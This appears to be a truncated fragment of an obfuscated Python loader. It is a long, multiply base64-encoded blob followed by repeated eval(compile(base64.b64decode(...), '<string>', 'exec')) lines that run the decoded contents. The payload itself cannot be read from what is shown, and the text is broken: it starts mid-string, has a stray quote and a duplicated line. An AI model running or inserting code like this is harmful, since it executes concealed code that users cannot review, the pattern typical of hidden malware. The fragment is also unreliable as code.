sRnFRbFZTYXpFeldrVldORlpGTVVsVmF6RldaV3RKZDFaRldrNWtNbEpHWlVaU1RsTkdTa1ZaYkZVeFpXeGtWMkZGT1d4aE1uaEtWVEl4TkdGck1WVmlTRUpoVW0xb1VGcFZaRk5XTURsWVpFZEdWMDFYT1RSWFZ6RnpZakpTU0ZOWWJGWmlXR2h3VlRCVmVFMVdXa2RaZWxab1RWaENXVnBFVGtOVlJtOTVUMWMxVkZaVk5VTlhha1p1WlZVMVdHRkhiRmROVmxwMVZsVmFUMUZ0U25SVWJsSlhZbTVDV2xSWGRIWmxSbXcyVkd0a1RsWnRaRFZXVnpFMFdWZEtjMWRxUmxSaWJWSXlWMnBDYzFKR1JsaGFSbXhPWWtWd2VsZFljRXRVTWxaWVVteHNVbUZyU205V2JuQnpUVlpPVmxWWVpHRk5iRXBWVlRKMFUyRlZNSGRqUkZaWVlrZE5NRmRxUm5kVFJscFlXa1p3YWsxRVozbFhXSEJQVWpBeFYyTkdhRlppVjJoTFZXcEdTMk14VGxaYVJrNXBVbTVDTVZadE5WZFhhekYwVGxWV2FtVnJhM2RaVmxaUFkwWkdXRnBGY0ZKTlJYQjBWMVJKZUZZeVJuTmFNMnhQVmpKb2NGWnFSbGRpYkZaSFZHdEthV0pIZERWVU1XaHpZVzFLVjFkcVNsaFNSWEJRV2tjeFMyUkdaSFZSYlVaT1ZrZDRNMVl5ZEU5aGJFMTNZa1ZTVWxZeVVrdFZWbU0xWW14T1ZsUnJTbUZOVjNneFZtMDFkMkZzWkVkWGJURllZVEpTV0Zsc1pGTlhSVFZZWTBkb1YyVnRkM2hXTUZKTFl6SkZlRkZzVWxKaVZFWnZWbXBHWVdWc1pISmhSVFZyVm14S1dWVnROVmRpUmxwR1kwUktXbUpVUmxkWmFrSjJaVlpPY1ZKdGNFNU5SbXcwVmpCU1MxVXlTa2RqU0ZaWFlteGFZVlJYTVRSTmJHeDBZa2R3YWsxSGVFcFdiR014Vm14SmVGZFlaRnBXYlZKUVdUQm9hazB4VW5WV2EzQlRUVlZ3ZWxVeFZtdFVWa3BKVm01V1ZXSnRhSEpXYWtaaFkyeGtWMVJ0Y0dwTlIzaEpWREZvVjFsV1NYaFhibkJZWWtkb1ZGbHJXa05XUm5CSVkwWndXRkpVVm5oV01WcHJWVEpLUm1ORVZtdE5iVkp4V1d4YVlVNUdjRWRhU0U1c1ZtNUNXVlpXVW5OVk1rcFdWMjV3V21WcmNGZFpNRlpQWTBaR1dGcEZjRkpOUlhCNFYxZHdUMU15VmxkalJtaFFWakZ3WVZSWGNITk5WbVIwVFZoT2FXSkhaRFZaYTJRd1ZWWlZkMU51VWxwV2JWSllXWHBHZDFOV1VsbFdiRlpYVFVadmVGZHNXbE5UTWxKMFUyNVNWMVo2YkV4VVZFRXhZakZrVlZScmRHaFNiV1ExVmtjMVlXRnRTbkpqU0U1YVlXdFZNVmxYTVVwbFZUVllUVmRvVjAxck5URldSVlpQVVRBeFZtSXpaRlZpYkhCeFdXMTBkMk14YkhWaVIzQnFUVWQ0U1ZReGFGZFpWa2w0VjI1d1dHSkhhRlJaYTFwRFZrWndTR05HY0ZoU1ZGWjRWakZhYTFVeVNrWmpSRlpyVFcxU2NWbHNXbUZPUm5CSFdraE9iRlp1UWxsV1ZsSnpWVEpLVmxkdWNGcGxhM0JYV1RCV1QyTkdSbGhhUlhCU1RVVnZNVll5ZUd0aE1YQjBWRzVTVjJKdVFuRlZiWEJ6WTBad1IyRkZPV3hTVjNoR1ZGVmthMWxYU2xobFNFNWFZVEpTVkZwWGREUmpNVlowWlVkNFZGSnJXakpWTW5CSFZUSktTRlpyYkZaaWJIQkxWVEJXZDJNeGJEWlVhMDVPVm01Q1dsWkhjRU5YYkZWNVZHNWtVazF0ZUVOWGFrSnpVV3hDVlUxSGJFUmlWbGw1VjFaa00ySXhhM2xQV0ZKcVVqSjRlbGRzVG05aFZteFpWRzE0VDJGc1JqRlhWM0JhVFVad1NGWnRjR2xOYkVwelV6QmpOVlZHVWpaUmJscHBUV3BzVVZaSWJISmpNR3hFVTFSb2FrMHhTalZaVm1NeFlteENjRk5ZVGtwUk1sSnpXbFZrVjJGcmNEVmhNMEZwUTIxV01sbFhkMjlaTWpsMFkwZHNjMXBUYUdsWldFNXNUbXBSZFZscVdUQmFSMVpxWWpKU2JFdEhPVkJVZWtKMllqSTVVRlI1YTNOSlEwazRZek5TZVdGWE5XNVFhVWx6U1VOa2JHVkhWbXBLZVd0d0lncGxkbUZzS0dOdmJYQnBiR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h2VDA4d2IyOXZUMDhwTENBaVBITjBjbWx1Wno0aUxDQW5aWGhsWXljcEtRPT0iCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))